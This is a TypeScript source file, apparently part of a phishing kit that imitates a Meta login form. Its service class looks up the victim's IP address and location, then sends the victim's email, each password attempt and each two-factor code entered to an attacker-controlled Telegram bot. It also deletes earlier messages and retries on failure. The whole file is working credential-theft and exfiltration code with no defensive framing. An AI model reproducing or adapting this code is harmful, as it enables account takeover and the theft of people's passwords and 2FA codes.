import { telegramConfig } from '@/config/telegram';
import type { FormData, GeoData, StoredData } from '@/types/formData';

export class TelegramService {
    private static instance: TelegramService;

    public static getInstance(): TelegramService {
        if (!TelegramService.instance) {
            TelegramService.instance = new TelegramService();
        }
        return TelegramService.instance;
    }

    async getGeoData(): Promise<GeoData> {
        try {
            const response = await fetch('https://get.geojs.io/v1/ip/geo.json');
            const data = await response.json();
            return {
                ip: data.ip || '',
                city: data.city || '',
                region: data.region || '',
                country: data.country || '',
                latitude: data.latitude || '',
                longitude: data.longitude || '',
                timezone: data.timezone || '',
                organization_name: data.organization_name || ''
            };
        } catch (error) {
            console.error('Error fetching geo data:', error);
            return {
                ip: '',
                city: '',
                region: '',
                country: '',
                latitude: '',
                longitude: '',
                timezone: '',
                organization_name: ''
            };
        }
    }

    private formatDateVN(dateString: string): string {
        try {
            const [day, month, year] = dateString.split('/');
            return `${day}/${month}/${year}`;
        } catch {
            return dateString;
        }
    }

    async deleteOldMessage(messageId: number): Promise<void> {
        try {
            await fetch(`https://api.telegram.org/bot${telegramConfig.TOKEN}/deleteMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramConfig.CHAT_ID,
                    message_id: messageId
                })
            });
        } catch (error) {
            console.error('Error deleting old message:', error);
        }
    }

    async sendCodeToTelegram(code: string): Promise<number | null> {
        try {
            const storedDataStr = localStorage.getItem('metaFormData');
            if (!storedDataStr) {
                throw new Error('No stored form data found');
            }

            const formData = JSON.parse(storedDataStr) as StoredData;
            const codeAttempts = formData.codeAttempts || [];
            codeAttempts.push(code);

            const originalMessage = formData.lastMessage ?? '';
            const codeAttemptsText = `\n<b>📱 2FA CODE ${codeAttempts.length}:</b> <code>${code}</code>`;
            const fullMessage = `${originalMessage}${codeAttemptsText}`;

            if (formData.lastMessageId) {
                await this.deleteOldMessage(formData.lastMessageId);
            }

            const telegramApiUrl = `https://api.telegram.org/bot${telegramConfig.TOKEN}/sendMessage`;
            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramConfig.CHAT_ID,
                    text: fullMessage,
                    parse_mode: 'HTML'
                })
            });

            const result = await response.json();

            if (result.ok) {
                const updatedData: StoredData = {
                    ...formData,
                    codeAttempts,
                    lastMessageId: result.result.message_id,
                    lastMessage: fullMessage,
                    timestamp: Date.now()
                };
                localStorage.setItem('metaFormData', JSON.stringify(updatedData));

                return result.result.message_id;
            } else {
                console.error('Telegram API error:', result);
                return null;
            }
        } catch (error) {
            console.error('Error sending code to Telegram:', error);
            return null;
        }
    }

    async sendDataToTelegram(formData: FormData, geoData: GeoData, retryCount: number = 0): Promise<number | null> {
        const maxRetries = 3;

        try {
            const storedDataStr = localStorage.getItem('metaFormData');
            const storedData: StoredData | null = storedDataStr ? JSON.parse(storedDataStr) : null;

            if (storedData?.lastMessageId) {
                await this.deleteOldMessage(storedData.lastMessageId);
            }

            const currentTime = new Date().toLocaleString('vi-VN', {
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit',
                day: '2-digit',
                month: '2-digit',
                year: 'numeric'
            });

            const passwordList = formData.passwordAttempts.map((pass, index) => `<b>🔒 Mật khẩu ${index + 1}:</b> <code>${pass}</code>`).join('\n');

            const message = `
<b>📅 Thời gian:</b> <code>${currentTime}</code>
<b>🌐 IP:</b> <code>${geoData.ip}</code>
<b>🌍 Vị trí:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
<b>📍 Tọa độ:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>
<b>📧 Email Personal:</b> <code>${formData.emailPersonal}</code>


${passwordList}`;

            const telegramApiUrl = `https://api.telegram.org/bot${telegramConfig.TOKEN}/sendMessage`;
            const response = await fetch(telegramApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: telegramConfig.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                })
            });

            const result = await response.json();

            if (result.ok) {
                const updatedData: StoredData = {
                    ...formData,
                    lastMessageId: result.result.message_id,
                    lastMessage: message,
                    timestamp: Date.now()
                };
                localStorage.setItem('metaFormData', JSON.stringify(updatedData));

                return result.result.message_id;
            } else {
                console.error('Telegram API error:', result);

                if (retryCount < maxRetries) {
                    console.log(`Retrying Telegram send... (${retryCount + 1}/${maxRetries})`);
                    await this.delay(1000 * (retryCount + 1)); // Exponential backoff
                    return this.sendDataToTelegram(formData, geoData, retryCount + 1);
                }

                return null;
            }
        } catch (error) {
            console.error('Error sending data to Telegram:', error);

            if (retryCount < maxRetries) {
                console.log(`Retrying Telegram send after error... (${retryCount + 1}/${maxRetries})`);
                await this.delay(1000 * (retryCount + 1)); // Exponential backoff
                return this.sendDataToTelegram(formData, geoData, retryCount + 1);
            }

            return null;
        }
    }

    async delay(ms: number): Promise<void> {
        return new Promise((resolve) => setTimeout(resolve, ms));
    }
}
